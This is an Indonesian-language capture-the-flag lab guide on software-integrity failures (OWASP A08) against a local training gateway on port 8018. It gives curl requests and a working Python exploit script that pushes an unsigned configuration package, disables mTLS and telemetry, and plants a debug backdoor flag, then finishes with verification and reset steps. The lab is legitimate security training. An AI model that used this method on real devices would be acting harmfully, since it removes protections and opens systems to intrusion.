# Panduan Praktik Eksploitasi & Verifikasi (A08)

Modul ini memandu Anda mengeksploitasi kerentanan integritas data dan perangkat lunak pada **Zitera Edge Gateway (Port 8018)**. Anda akan menguji penerimaan paket pembaruan tanpa tanda tangan digital yang sah, memodifikasi parameter sistem aktif, dan memverifikasi keberhasilan eksploitasi.

---

## Metodologi Uji Penetrasi 4 Tahap

```
[Tahap 1: Observasi (15%)] ──> [Tahap 2: Injeksi Anomali (25%)] ──> [Tahap 3: Weaponization (35%)] ──> [Tahap 4: Remediasi (25%)]
   Inspeksi Konfigurasi           Uji Parameter Tanpa Tanda         Suntik Backdoor & Mutasi           Verifikasi Integritas &
       Aktif Default                     Tangan Digital                 Konfigurasi Runtime              Check Endpoint Lulus
```

---

## Tahap 1: Pengamatan & Pemetaan Permukaan Serangan (15%)

Langkah awal adalah menginspeksi konfigurasi pabrik yang sedang aktif pada gateway.

### 1.1 Periksa Status Kesehatan Layanan (Manual cURL)
Lakukan query ke endpoint healthcheck:

```bash
curl -i -s http://localhost:8018/health
```

Respons yang diharapkan:
```json
{"status": "ok", "lab": "A08", "port": 8018}
```

### 1.2 Ambil Konfigurasi Aktif Default (Manual cURL)
Ambil parameter runtime saat ini dari gateway:

```bash
curl -i -s http://localhost:8018/api/config
```

Respons menunjukkan konfigurasi awal yang ditandatangani oleh root authority resmi:
```json
{
  "version": "1.0.0",
  "signature_verified": true,
  "signer": "zitera-root-authority",
  "params": {
    "telemetry_level": "standard",
    "enforce_mtls": true
  }
}
```

Perhatikan bahwa sistem saat ini mengaktifkan `enforce_mtls: true` dan berada di bawah penandatangan resmi `zitera-root-authority`.

---

## Tahap 2: Uji Kegagalan Integritas & Injeksi Anomali (25%)

Pada tahap ini, kita menguji apakah gateway memeriksa keaslian tanda tangan digital ketika menerima paket pembaruan baru melalui `POST /api/deploy_update`.

### 2.1 Mengirim Paket Pembaruan dengan Deklarasi Tidak Terverifikasi (Manual cURL)
Kirimkan permintaan HTTP POST dengan payload JSON kustom yang menyatakan bahwa tanda tangan **belum diverifikasi**:

```bash
curl -i -X POST http://localhost:8018/api/deploy_update \
  -H "Content-Type: application/json" \
  -d '{
    "version": "2.0.0-custom",
    "signature_verified": false,
    "signer": "unverified-external-source",
    "params": {
      "enforce_mtls": false
    }
  }'
```

### 2.2 Analisis Respons Gateway
Server merespons dengan status `HTTP/1.0 200 OK`:
```json
{
  "status": "applied",
  "message": "Configuration package deployed directly into memory.",
  "active_config": {
    "version": "2.0.0-custom",
    "signature_verified": false,
    "signer": "unverified-external-source",
    "params": {
      "enforce_mtls": false
    }
  }
}
```

Sistem tidak menolak muatan tersebut meskipun `"signature_verified": false`. Gateway langsung menerapkan paket tersebut ke dalam memori kerja!

---

## Tahap 3: Konstruksi Eksploitasi & Weaponization (35%)

Setelah memastikan backend tidak menolak data tanpa tanda tangan, kita susun eksploitasi penuh untuk mematikan mekanisme keamanan mTLS dan menanam parameter backdoor debug (`debug_backdoor: true`).

### 3.1 Skrip Otomasi Eksploitasi Python (`exploit_integrity.py`)

Gunakan skrip Python berikut untuk memodifikasi konfigurasi edge secara otomatis:

```python
import json
import urllib.request

TARGET_URL = "http://localhost:8018/api/deploy_update"

malicious_package = {
    "version": "9.9.9-malicious",
    "signature_verified": False,
    "signer": "adversary-control-node",
    "params": {
        "telemetry_level": "disabled",
        "enforce_mtls": False,
        "debug_backdoor": True
    }
}

req = urllib.request.Request(
    TARGET_URL,
    data=json.dumps(malicious_package).encode("utf-8"),
    headers={"Content-Type": "application/json"},
    method="POST"
)

try:
    with urllib.request.urlopen(req) as response:
        body = response.read().decode("utf-8")
        result = json.loads(body)
        print("[+] Status Respon:", response.status)
        print("[+] Payload Diterapkan:", json.dumps(result.get("active_config"), indent=2))
        if "flag" in result:
            print("[+] Challenge Flag Berhasil Didapatkan!")
            print("[+] Flag:", result["flag"])
except Exception as e:
    print("[-] Error saat mengirim exploit:", e)
```

Jalankan skrip eksploitasi:
```bash
python exploit_integrity.py
```

Respons server mengembalikan flag keberhasilan penetrasi integritas perangkat lunak (`ZITERA{...}`).

---

## Tahap 4: Verifikasi & Audit Remediasi Pertahanan (25%)

### 4.1 Verifikasi Kelulusan Target Lab
Uji apakah target lab telah terpenuhi menggunakan endpoint verifikasi evaluasi:

```bash
curl -s http://localhost:8018/practice/verify
```

Respons yang diharapkan:
```json
{
  "status": "passed",
  "message": "Software integrity failure demonstrated: System accepted unverified/tampered configuration package into active runtime!"
}
```

### 4.2 Reset Konfigurasi ke Kondisi Aman
Setelah pengujian selesai, kembalikan state gateway ke setelan pabrik yang valid:

```bash
curl -X POST http://localhost:8018/api/reset
```

Konfirmasi bahwa konfigurasi telah kembali aman:
```bash
curl -s http://localhost:8018/api/config
```
Kembalian harus menunjukkan `"signature_verified": true` dan `"enforce_mtls": true`.
